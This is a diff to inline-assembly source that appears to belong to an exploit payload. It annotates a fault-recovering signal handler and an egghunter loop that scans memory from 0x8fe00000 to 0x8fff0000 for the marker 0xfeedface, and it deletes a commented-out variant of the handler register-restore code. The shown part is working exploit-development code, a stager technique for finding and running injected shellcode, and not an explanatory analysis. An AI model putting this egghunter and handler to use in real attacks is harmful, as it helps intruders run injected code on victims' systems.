@@ -1012,6 +1012,9 @@ init:
 get_pc:
 		call init
 
+// this is weird, depending on stars allignment the context's offset 
+// and so we just scan the stack for a register we know it's not 
+// changed by the kernel(ebp)
 sig_handler:
 		mov eax, esp
 sig_loop:
@@ -1021,12 +1024,14 @@ sig_loop:
 
 		add eax, 0x4
 		mov esp, eax
+		// now esp points to the faulting ESP value
+		// in the middle of the thread context
 	
 		sub [esp], 4		// make room for retaddr
 		mov eax, [esp]		// eax == faulting esp
 
 		mov ebx, [esp+0xc]	// eax == faulting EIP
-		add ebx, 8			// add to EIP
+		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter
 		mov [eax], ebx		// save retaddr
 		
 		mov eax, [esp-0x1c]
@@ -1037,26 +1042,7 @@ sig_loop:
 		mov edi, [esp-0x8]
 		mov ebp, [esp-0x4]
 		mov esp, [esp]
-		ret
-
-/*
-
-		sub DWORD PTR [esp+0x54], 0x4
-		mov eax, DWORD PTR [esp+0x54]
-		mov ebx, DWORD PTR [esp+0x60]
-		add ebx, 0x8
-		mov DWORD PTR [eax], ebx
-
-		mov eax, [esp+0x38]
-		mov ebx, [esp+0x3c]
-		mov ecx, [esp+0x40]
-		mov edx, [esp+0x44]
-		mov esi, [esp+0x48]
-		mov edi, [esp+0x4c]
-		mov ebp, [esp+0x50]
-		mov esp, [esp+0x54]
-		ret
-*/
+		ret					
 
 l_out:
 	}
@@ -1077,6 +1063,8 @@ l_out:
 		add esp, 0x10
 	}
 
+	// egghunter: scan for the first 0xfeedface from 
+	// 0x8fe00000 to 0x8fff0000
 	__asm__ __volatile__ {
 		mov eax, 0x8fe00000
 l_loop:
